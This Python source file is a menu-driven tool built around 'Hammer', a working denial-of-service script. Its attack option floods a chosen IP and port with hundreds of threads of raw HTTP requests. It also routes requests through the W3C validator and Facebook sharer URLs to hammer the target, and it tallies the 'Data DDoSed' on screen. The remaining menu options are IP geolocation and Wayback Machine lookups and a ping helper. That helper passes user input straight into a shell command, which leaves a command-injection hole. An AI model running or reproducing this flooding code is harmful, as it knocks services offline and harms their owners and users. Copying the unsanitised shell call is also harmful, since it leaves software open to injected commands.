import time, sys, socket, threading, logging, urllib.request, random, re, requests, os, platform, subprocess
from queue import Queue
from optparse import OptionParser
from datetime import datetime

# ANSI escape code for dark green color
GREEN = '\033[0;32m'
Black="\033[0;30m"        # Black
Red="\033[0;31m"          # Red
Green="\033[0;32m"        # Green
Yellow="\033[0;33m"       # Yellow
Blue="\033[0;34m"         # Blue
Purple="\033[0;35m"       # Purple
Cyan="\033[0;36m"         # Cyan
White="\033[0;37m"        # White
# ANSI escape code to reset terminal color
RESET = '\033[0m'


def user_agent():
    global uagent
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36 OPR/45.0.2552.898")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36 OPR/45.0.2552.898")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36")

    return uagent

def my_bots():
    global bots
    bots = []
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    return bots

def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            time.sleep(0.1)
    except:
        time.sleep(0.1)

def down_it(item):
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
            else:
                s.shutdown(1)
            time.sleep(0.1)
    except socket.error as e:
        time.sleep(0.1)

def dos():
    global data_ddosed
    global post_requests
    while True:
        item = q.get()
        down_it(item)
        data_ddosed += len(data)
        post_requests += 1
        q.task_done()

def dos2():
    global data_ddosed
    global post_requests
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + "http://" + host)
        data_ddosed += len(data)
        post_requests += 1
        w.task_done()

def usage():
    clear_terminal()
    print(''' \033[92m    Hammer Dos Script v.1 http://www.canyalcin.com/ Modified by Kf637
    It is the end user's responsibility to obey all applicable laws.
    It is just for server testing script. Your IP is visible. \033[0m''')
    return_to_menu()

def validate_ip_address(ip_address):
    pattern = re.compile(r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
    return pattern.match(ip_address)

def clear_terminal():
    system = platform.system()
    if system == 'Windows':
        os.system('cls')
    else:
        os.system('clear')

def get_parameters():
    global host
    global port
    global thr
    global item
    host = input("Enter the server IP: ")
    
    while not validate_ip_address(host):
        print("Invalid IP address. Please enter a valid IP address.")
        host = input("Enter the server IP: ")

    port = input("Enter the port (skip for default 80): ")
    turbo = input("Enter the turbo (skip for default 135): ")
    
    try:
        port = int(port)
    except ValueError:
        print("Invalid port. Using default port 80.")
        port = 80
    
    try:
        thr = int(turbo)
    except ValueError:
        print("Invalid turbo value. Using default turbo 135.")
        thr = 135
    
    if turbo != "":
        turbo = int(turbo)
        if turbo > 451:
            yesno = input("Seems like you put turbo to a value over 450, are you sure you want to do it?\nLower-end systems can have performance issues. Yes|No: ")
            if not yesno.lower() == 'yes':
                sys.exit()

def get_ip_from_url(url):
    try:
        ip_address = socket.gethostbyname(url)
        return ip_address
    except socket.gaierror:
        return None
    
def get_ip_info(ip_address):
    url = f"http://ip-api.com/json/{ip_address}"
    response = requests.get(url)
    data = response.json()

    if data["status"] == "fail":
        print("Failed to retrieve IP information.")
        return
    clear_terminal()
    ip_info = f"\n{GREEN}ISP: {data['isp']}{RESET}\n" \
              f"{GREEN}Organization: {data['org']}{RESET}\n" \
              f"{GREEN}City: {data['city']}{RESET}\n" \
              f"{GREEN}Region: {data['regionName']}{RESET}\n" \
              f"{GREEN}Country: {data['country']}{RESET}\n" \
              f"{GREEN}Postal Code: {data['zip']}{RESET}\n" \
              f"{GREEN}Latitude: {data['lat']}{RESET}\n" \
              f"{GREEN}Longitude: {data['lon']}{RESET}\n"
    print(ip_info)
    return_to_menu()


def return_to_menu():
    input('\nPlease press the "Enter" key to navigate back to the main menu.')
    main()

def is_valid_url(url):
    # Regular expression pattern for URL validation
    url_pattern = re.compile(
        r'^(?:(?:https?|ftp)s?://)?'  # optional http:// or https:// prefix
        r'(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+'  # domain...
        r'(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)'  # ...top-level domain
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

    return re.match(url_pattern, url) is not None


def search_wayback_machine():
    clear_terminal()
    print("""

██╗    ██╗ █████╗ ██╗   ██╗██████╗  █████╗  ██████╗██╗  ██╗    ███╗   ███╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗███████╗    ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗ 
██║    ██║██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝    ████╗ ████║██╔══██╗██╔════╝██║  ██║██║████╗  ██║██╔════╝    ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗
██║ █╗ ██║███████║ ╚████╔╝ ██████╔╝███████║██║     █████╔╝     ██╔████╔██║███████║██║     ███████║██║██╔██╗ ██║█████╗      ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝
██║███╗██║██╔══██║  ╚██╔╝  ██╔══██╗██╔══██║██║     ██╔═██╗     ██║╚██╔╝██║██╔══██║██║     ██╔══██║██║██║╚██╗██║██╔══╝      ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝ 
╚███╔███╔╝██║  ██║   ██║   ██████╔╝██║  ██║╚██████╗██║  ██╗    ██║ ╚═╝ ██║██║  ██║╚██████╗██║  ██║██║██║ ╚████║███████╗    ███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║     
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     
                                                                                                                                                                              
                                                                                                                       
    """)
    url = input("Enter the URL to search in Wayback Machine: ")
    if url == "":
        search_wayback_machine()
    if not is_valid_url(url):
        print("\nInvalid URL, please wait...")
        time.sleep(2)
        search_wayback_machine()
    api_url = 'http://archive.org/wayback/available?url=' + url
    response = requests.get(api_url)
    data = response.json()

    if 'archived_snapshots' in data and 'closest' in data['archived_snapshots']:
        snapshot_url = data['archived_snapshots']['closest']['url']
        timestamp_url = data['archived_snapshots']['closest']['timestamp']
        datetime_obj = datetime.strptime(timestamp_url, "%Y%m%d%H%M%S")
        formatted_date = datetime_obj.strftime("%B %d, %Y, at %H:%M:%S")
        print(f"URL found in Wayback Machine: {snapshot_url} from {formatted_date}")
        return_to_menu()
        #print(snapshot_url)
    else:
        print("URL not found in Wayback Machine.")
        return_to_menu()


def IpTools():
    clear_terminal()
    print("""
    ██╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     ███████╗
    ██║██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
    ██║██████╔╝       ██║   ██║   ██║██║   ██║██║     ███████╗
    ██║██╔═══╝        ██║   ██║   ██║██║   ██║██║     ╚════██║
    ██║██║            ██║   ╚██████╔╝╚██████╔╝███████╗███████║
    ╚═╝╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝

    """)
    print('1. IP Info\n2. Get IP from URL\n3. Wayback Machine\n4. Back')
    choice = input("Enter your choice: ")
    if choice == "1":
        ip_address = input("Enter the IP address: ")
        get_ip_info(ip_address)
    
    elif choice == "2":
        url = input("Enter the URL: ")
        ip_address = get_ip_from_url(url)
        if ip_address:
            print(f"\n{GREEN}The IP address of {RESET}{url}{GREEN} is: {RESET}{ip_address}\n")
            return_to_menu()
        else:
            print(f"Unable to retrieve IP address for {url}. Please check the URL and try again.")
            return_to_menu()
    elif choice == "3":
        search_wayback_machine()
    elif choice == "4":
        main()
    else:
        print("\nInvalid choice. Please wait...\n")
        time.sleep(2)
        clear_terminal()
        IpTools()


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()

# task queues are q and w
q = Queue()
w = Queue()

data_ddosed = 0
post_requests = 0

def main():
    clear_terminal()
    print("""

██╗  ██╗███████╗ ██████╗ ██████╗ ███████╗    ██╗   ██╗██████╗ ██╗         ██╗██╗██████╗     ███╗   ███╗██╗   ██╗██╗  ████████╗██╗████████╗ ██████╗  ██████╗ ██╗     
██║ ██╔╝██╔════╝██╔════╝ ╚════██╗╚════██║    ██║   ██║██╔══██╗██║        ██╔╝██║██╔══██╗    ████╗ ████║██║   ██║██║  ╚══██╔══╝██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     
█████╔╝ █████╗  ███████╗  █████╔╝    ██╔╝    ██║   ██║██████╔╝██║       ██╔╝ ██║██████╔╝    ██╔████╔██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║     
██╔═██╗ ██╔══╝  ██╔═══██╗ ╚═══██╗   ██╔╝     ██║   ██║██╔══██╗██║      ██╔╝  ██║██╔═══╝     ██║╚██╔╝██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║     
██║  ██╗██║     ╚██████╔╝██████╔╝   ██║      ╚██████╔╝██║  ██║███████╗██╔╝   ██║██║         ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║   ██║   ╚██████╔╝╚██████╔╝███████╗
╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═════╝    ╚═╝       ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝    ╚═╝╚═╝         ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                                                                                                                    
""")
    print("1. Help\n2. Attack DOS\n3. IP Tools\n4. Debug\n5. Exit")
    choice = input("Enter your choice: ")
    if choice == "1":
        usage()
    elif choice == "2":
        get_parameters()
        print("\033[92m", host, " port:", str(port), " turbo:", str(thr), "\033[0m")
        print("\033[94mPlease wait...\033[0m")
        user_agent()
        my_bots()
        time.sleep(5)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            s.settimeout(1)
        except socket.error as e:
            print("\033[91mcheck server IP and port\033[0m")
            sys.exit()

        for i in range(int(thr)):
            t = threading.Thread(target=dos)
            t.daemon = True  # if thread exists, it dies
            t.start()
            t2 = threading.Thread(target=dos2)
            t2.daemon = True  # if thread exists, it dies
            t2.start()

        start = time.time()
        item = 0
        while True:
            if item > 1800:
                item = 0
                time.sleep(0.1)
            item += 1
            q.put(item)
            w.put(item)
            sys.stdout.write("\033[K")  # Clear the line
            sys.stdout.write(f"\rData DDoSed: {data_ddosed} bytes  POST requests: {post_requests}")
            sys.stdout.flush()
        q.join()
        w.join()
    
        
    elif choice == "3":
        IpTools()

    
    elif choice == "4":
       debug_menu()

    elif choice == "5":
        clear_terminal()
        print(f"""{Cyan}

██╗  ██╗ █████╗ ██╗   ██╗███████╗     █████╗     ███╗   ██╗██╗ ██████╗███████╗    ██████╗  █████╗ ██╗   ██╗██╗
██║  ██║██╔══██╗██║   ██║██╔════╝    ██╔══██╗    ████╗  ██║██║██╔════╝██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║
███████║███████║██║   ██║█████╗      ███████║    ██╔██╗ ██║██║██║     █████╗      ██║  ██║███████║ ╚████╔╝ ██║
██╔══██║██╔══██║╚██╗ ██╔╝██╔══╝      ██╔══██║    ██║╚██╗██║██║██║     ██╔══╝      ██║  ██║██╔══██║  ╚██╔╝  ╚═╝
██║  ██║██║  ██║ ╚████╔╝ ███████╗    ██║  ██║    ██║ ╚████║██║╚██████╗███████╗    ██████╔╝██║  ██║   ██║   ██╗
╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝    ╚═╝  ╚═╝    ╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝
                                                                                                              
{RESET}""")
        sys.exit()
    else:
        print("\nInvalid choice. Please wait...\n")
        time.sleep(2)
        clear_terminal()
        main()


def debug_menu():
     
        clear_terminal()
        print("""


██████╗ ███████╗██████╗ ██╗   ██╗ ██████╗     ███╗   ███╗███████╗███╗   ██╗██╗   ██╗
██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝     ████╗ ████║██╔════╝████╗  ██║██║   ██║
██║  ██║█████╗  ██████╔╝██║   ██║██║  ███╗    ██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║
██║  ██║██╔══╝  ██╔══██╗██║   ██║██║   ██║    ██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║
██████╔╝███████╗██████╔╝╚██████╔╝╚██████╔╝    ██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚═════╝     ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                                                                                                                                                                                                        
""")
        print("1. Print Shell Color\n2. Ping IP/URL\n3. Exit")
        choice = input("Enter your choice: ")
        if choice == "1":
            clear_terminal()
            print(f"{Black}Black{Red} Red{GREEN} Green{Yellow} Yellow{Blue} Blue{Purple} Purple{Cyan} Cyan{White} White")
            input('\nPlease press the "Enter" key to navigate back to the main menu.')
            debug_menu()
        elif choice == "2":
            clear_terminal()
            ip_address = input("Enter IP or URL: ")
            if ip_address == "":
                print(f'{Red}Input cannot be empty, going back...{RESET}')
                time.sleep(3)
                debug_menu()
            result = ping_ip_address(ip_address)
            if result:
                print(f"Successfully pinged {ip_address}")
            else:
                print(f"Failed to ping {ip_address}")
            input('\nPlease press the "Enter" key to navigate back.')
            debug_menu()
            
        elif choice == "3":
            main()

        else:
            print("\nInvalid choice. Please wait...\n")
            time.sleep(2)
            clear_terminal()
            debug_menu()

def ping_ip_address(ip_address):
    try:
        output = subprocess.check_output(f"ping {ip_address} -n 1", shell=True)
        output = output.decode('utf-8')  # Convert bytes to string
        if "Reply from" in output:
            return True
        else:
            return False
    except subprocess.CalledProcessError:
        return False
    
main()